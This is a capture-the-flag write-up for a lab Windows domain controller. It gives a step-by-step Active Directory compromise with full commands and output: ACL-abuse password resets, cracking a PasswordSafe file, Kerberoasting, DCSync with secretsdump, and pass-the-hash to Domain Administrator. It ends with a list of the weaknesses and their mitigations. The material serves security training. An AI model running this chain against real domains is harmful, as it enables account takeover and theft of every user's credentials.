# Machine Information

<table>
<tr>
<td><strong>IP Address</strong></td>
<td>10.129.106.162</td>
</tr>
<tr>
<td><strong>Operating System</strong></td>
<td>Windows</td>
</tr>
<tr>
<td><strong>Hostname</strong></td>
<td>DC</td>
</tr>
<tr>
<td><strong>Domain</strong></td>
<td>administrator.htb</td>
</tr>
<tr>
<td><strong>Release Date</strong></td>
<td>October 2026</td>
</tr>
<tr>
<td><strong>Difficulty</strong></td>
<td>Medium</td>
</tr>
</table>

# Machine Description

Administrator is a medium-difficulty Windows machine that demonstrates the dangers of insecure privilege delegation and weak password management in Active Directory environments. The exploitation path exploits a chain of ACL-based privilege escalation vectors, progresses through credential extraction from encrypted password managers, and culminates in a DCSync attack to achieve complete domain compromise.

# Exploitation Summary

The attack chain involved:

1. **Initial Access**: Enumerating Active Directory structure using BloodHound and leveraging the Olivia user account with GenericAll privilege over Michael
2. **Credential Escalation**: Exploiting ACL chains (GenericAll → ForceChangePassword) to escalate from Olivia to Michael to Benjamin
3. **Password Manager Access**: Accessing the FTP service and extracting an encrypted PasswordSafe database file
4. **Password Cracking**: Using pwsafe2john and John the Ripper to crack the PasswordSafe database passphrase
5. **Remote Access**: Leveraging Emily's credentials from the password manager to access the Domain Controller via WinRM
6. **Privilege Escalation**: Exploiting GenericWrite privilege over Ethan to perform a Kerberoasting attack
7. **Credential Extraction**: Using the cracked Ethan credentials to perform a DCSync attack and extract the Administrator NTLM hash
8. **Domain Administrator Access**: Using the obtained hash to authenticate as Domain Administrator and retrieve the root flag

# Detailed Walkthrough

## Road to User Flag

### ***Phase 1: Initial Network Reconnaissance and Service Discovery***

I began by scanning the target machine with Nmap to identify open ports and running services:

```
$ sudo nmap 10.129.106.162 -Pn -sV

...SNIP...

PORT     STATE SERVICE       VERSION  
21/tcp   open  ftp           Microsoft ftpd  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-07 04:24:17Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site:  
Default-First-Site-Name)  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  tcpwrapped  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site:  
Default-First-Site-Name)  
3269/tcp open  tcpwrapped  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

...SNIP...
```

The scan revealed a fully functional Windows Domain Controller. The LDAP banner confirmed the domain name as `administrator.htb`. The presence of FTP (port 21) was also noted as a potential attack vector.

### ***Phase 2: Active Directory Enumeration with BloodHound***

With initial reconnaissance completed, I proceeded to enumerate the Active Directory structure using BloodHound data collector. I used the provided credentials for the `olivia` user account to gather comprehensive domain information:

```
$ bloodhound-python -d administrator.htb -c all -u Olivia -p ichliebedich -ns 10.129.106.162 -k --zip
```

After importing the collected data into BloodHound, I analyzed the privilege relationships and discovered that `olivia` possessed `GenericAll` privilege over the `michael` user account. 

![](HTB-machines/Medium/Windows/Administrator/1.png)

This privilege is extremely powerful, as it grants complete control over the target object, including the ability to modify the user's password.

### ***Phase 3: ACL Chain Exploitation - Olivia to Michael***

Leveraging the `GenericAll` privilege discovered in BloodHound, I proceeded to modify `michael`'s password. I used the `net rpc` command to reset the password to a controlled value:

```
$ net rpc password "michael" "pass123!" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "DC.administrator.htb"
```

I verified that the password change was successful by authenticating with the new credentials using Netexec:

```
$ nxc smb 10.129.106.162 -d administrator.htb -u michael -p pass123!

...SNIP...
  
SMB         10.129.106.162   445    DC               [+] administrator.htb\michael:pass123!
```

The command confirmed successful authentication, establishing that `michael`'s account was now accessible with the credentials `michael:pass123!`.

### ***Phase 4: ACL Chain Exploitation - Michael to Benjamin***

Upon analyzing `michael`'s privileges in BloodHound, I discovered that `michael` possessed `ForceChangePassword` privilege over the `benjamin` user account.

![](HTB-machines/Medium/Windows/Administrator/2.png)

`ForceChangePassword` is another dangerous privilege that permits resetting a user's password without knowing the current one. Following the same approach as before, I reset `benjamin`'s password:

```
$ net rpc password "benjamin" "pass123!" -U "administrator.htb"/"michael"%"pass123!" -S "DC.administrator.htb"
```

I verified the successful password change:

```
$ nxc smb 10.129.106.162 -d administrator.htb -u benjamin -p pass123!

...SNIP...

SMB         10.129.106.162   445    DC               [+] administrator.htb\benjamin:pass123!
```

`benjamin`'s account was now compromised with the credentials `benjamin:pass123!`.

### ***Phase 5: FTP Access and PasswordSafe Database Extraction***

With `benjamin`'s credentials, I attempted to access the FTP service running on port 21. FTP was accessible, and upon listing the files, I discovered a backup file with a `.psafe3` extension, indicating an encrypted PasswordSafe database:

```
$ ftp benjamin@10.129.106.162

...SNIP...

ftp> get Backup.psafe3

...SNIP...
```

PasswordSafe is an open-source password manager that stores encrypted credentials in a locally managed database file. The database is protected by a master passphrase, making it a valuable target if the file can be accessed. I successfully downloaded the Backup.psafe3 file from the FTP server.

### ***Phase 6: PasswordSafe Database Cracking***

To extract the master passphrase from the PasswordSafe database, I used the `pwsafe2john` utility, which converts the PasswordSafe database into a format that can be cracked with John the Ripper:

```
$ pwsafe2john Backup.psafe3
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
```

The utility extracted a hash containing the encrypted master passphrase and metadata. I saved this hash to a file and proceeded to crack it using John the Ripper with the rockyou.txt wordlist:

```
$ echo 'Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050' > db.hash
```

```
$ john db.hash --wordlist=/home/yus3r/Tools/SecLists/Passwords/rockyou.txt  

...SNIP...
  
tekieromucho     (Backu)        

...SNIP...
```

John the Ripper successfully cracked the master passphrase: `tekieromucho`.

### ***Phase 7: Password Manager Access and Credential Extraction***

With the master passphrase obtained, I opened the PasswordSafe database using the GUI application and entered the cracked passphrase. The database contained stored credentials for three users: `emily`, `emma` and `alexander`. 

![](HTB-machines/Medium/Windows/Administrator/3.png)

Among these credentials, the `emily` user account was particularly valuable because, as discovered during the BloodHound analysis, `emily` was a member of the Remote Management Users group, which grants access to the Domain Controller via WinRM. 

![](HTB-machines/Medium/Windows/Administrator/4.png)

I extracted Emily's credentials from the password manager: `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`.

### ***Phase 8: WinRM Access and User Flag Retrieval***

With `emily`'s credentials obtained, I established a remote shell session to the Domain Controller using WinRM via the evil-winrm tool:

```
$ evil-winrm -i 10.129.106.162 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

Upon successful authentication, I navigated to `emily`'s Desktop directory and retrieved the user flag:

```
*Evil-WinRM* PS C:\Users\emily> type Desktop\user.txt
```

<mark>User flag</mark>: `b31affc32582dd5ebce36e464800d8c3`

## Road to Root Flag

### ***Phase 1: Kerberoasting Attack on Ethan***

Upon gaining access to the Domain Controller as the `emily` user, I continued enumerating the system to identify further privilege escalation vectors. During the BloodHound analysis, I had observed that `emily` possessed `GenericWrite` privilege over the `ethan` user account. 

![](HTB-machines/Medium/Windows/Administrator/5.png)

`GenericWrite` permits modification of certain attributes of the target object, including the ability to add Service Principal Names (SPNs) to a user account. The `ethan` account appeared to be a service account with significant privileges, and the ability to modify his SPN presented an opportunity to perform a Kerberoasting attack. Kerberoasting is an attack technique that exploits the ability to add SPNs to user accounts. Once an SPN is added, the attacker can request a Kerberos TGS (Ticket Granting Service) ticket for that SPN. The TGS ticket is encrypted with the user's NTLM hash, and if the password is weak, the hash can be cracked offline. I leveraged `emily`'s `GenericWrite` privilege over `ethan` by using the `targetedKerberoast.py` tool, which automates the entire process:

```
$ python3 ./targetedKerberoast.py -v --dc-ip 10.129.106.162 -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks  
[*] Fetching usernames from Active Directory with LDAP  
[VERBOSE] SPN added successfully for (ethan)  
[+] Printing hash for (ethan)  
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$771a406aeb46f53723fa036a68c9bfdb$2965df49351dda41b23...SNIP...
```

The tool successfully added an SPN to `ethan`'s account, requested a TGS ticket, and extracted the hash for offline cracking.

### ***Phase 2: Kerberos Hash Cracking***

I saved the extracted Kerberos TGS hash to a file and used John the Ripper to crack it against the `rockyou.txt` wordlist:

```
$ john ethantgt.hash --wordlist=/home/yus3r/Tools/SecLists/Passwords/rockyou.txt

...SNIP...
 
limpbizkit       (?)        

...SNIP...
```

John successfully cracked the hash, revealing Ethan's password: `limpbizkit`.

### ***Phase 3: DCSync Attack Enumeration***

Upon obtaining `ethan`'s credentials, I returned to the BloodHound analysis to examine `ethan`'s privilege level. The analysis revealed that `ethan` possessed the `GetChanges` and `GetChangesAll` privileges over the domain object. 

![](HTB-machines/Medium/Windows/Administrator/6.png)

These privileges are extremely dangerous, as they permit an attacker to perform a DCSync attack by impersonate a Domain Controller and request a complete replication of the Active Directory database, including the NTDS.dit file containing all user password hashes.

### ***Phase 4: DCSync Attack Execution***

With `ethan`'s credentials and the necessary privileges confirmed, I proceeded to execute a DCSync attack using the `impacket-secretsdump` utility:

```
$ impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@10.129.106.162

...SNIP...
 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::  

...SNIP...
```

The DCSync attack was successful, and secretsdump extracted the NTDS.dit database contents, including the password hashes for all domain users. The output contained the `Administrator` account's NTLM hash.

### ***Phase 5: Domain Administrator Access and Root Flag Retrieval***

With the `Administrator` NTLM hash obtained, I authenticated to the Domain Controller as the `Administrator` using evil-winrm with Pass-the-Hash authentication:

```
$ evil-winrm -i 10.129.106.162 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

Upon successful authentication as the Domain Administrator, I navigated to the `Administrator`'s Desktop directory and retrieved the root flag:

```
*Evil-WinRM* PS C:\Users\Administrator> type Desktop\root.txt
```

<mark>Root flag</mark>: `417c245ab9fbdd56e38a2a6d1acd5d77`

# Key Vulnerabilities Exploited

- **Insecure ACL Delegation**: The Olivia user possessed GenericAll privilege over Michael, and Michael possessed ForceChangePassword privilege over Benjamin, creating an escalation chain accessible through credential modification
- **Weak PasswordSafe Master Passphrase**: The master passphrase protecting the PasswordSafe database was weak and present in standard wordlists, allowing offline cracking via John the Ripper
- **Unnecessary FTP Access**: Sensitive backup files containing encrypted databases were stored on an FTP server accessible to low-privileged users without proper access controls
- **Dangerous Group Membership**: The Emily account possessed Remote Management Users group membership without corresponding restrictions, granting WinRM access to the Domain Controller
- **Uncontrolled SPN Addition**: The Emily user's GenericWrite privilege over Ethan permitted the addition of SPNs, enabling a Kerberoasting attack against a service account
- **Excessive Privilege Assignment**: The Ethan account possessed GetChanges and GetChangesAll privileges over the domain, permitting unrestricted DCSync attacks and complete database replication
- **Lack of Privilege Segregation**: Multiple users possessed dangerous privileges (GenericAll, ForceChangePassword, GenericWrite) that should have been restricted to administrative accounts only

# Conclusion

The Administrator machine demonstrates how interconnected Active Directory misconfigurations create a cascading privilege escalation path to complete domain compromise. Each vulnerability alone would represent a significant security concern, yet their combination through ACL chains, weak credential management, and excessive privilege assignment enables a methodical progression from a low-privileged user to Domain Administrator. To mitigate these vulnerabilities, organizations should conduct regular ACL audits to eliminate overly permissive permissions on sensitive accounts. Sensitive systems like password managers must be protected with strong passphrases, and access controls on backup files should be strictly enforced. Service accounts should be assigned minimal privileges, with dangerous permissions like GetChanges restricted through delegation model controls. Multi-factor authentication should be implemented for all remote access protocols, and password policies must enforce complexity requirements with regular rotation. Monitoring systems should detect unusual Kerberoasting and replication activity that indicate compromise attempts. This case study illustrates that Active Directory security requires defense in depth, as layered misconfigurations create an irresistible path to complete domain compromise.
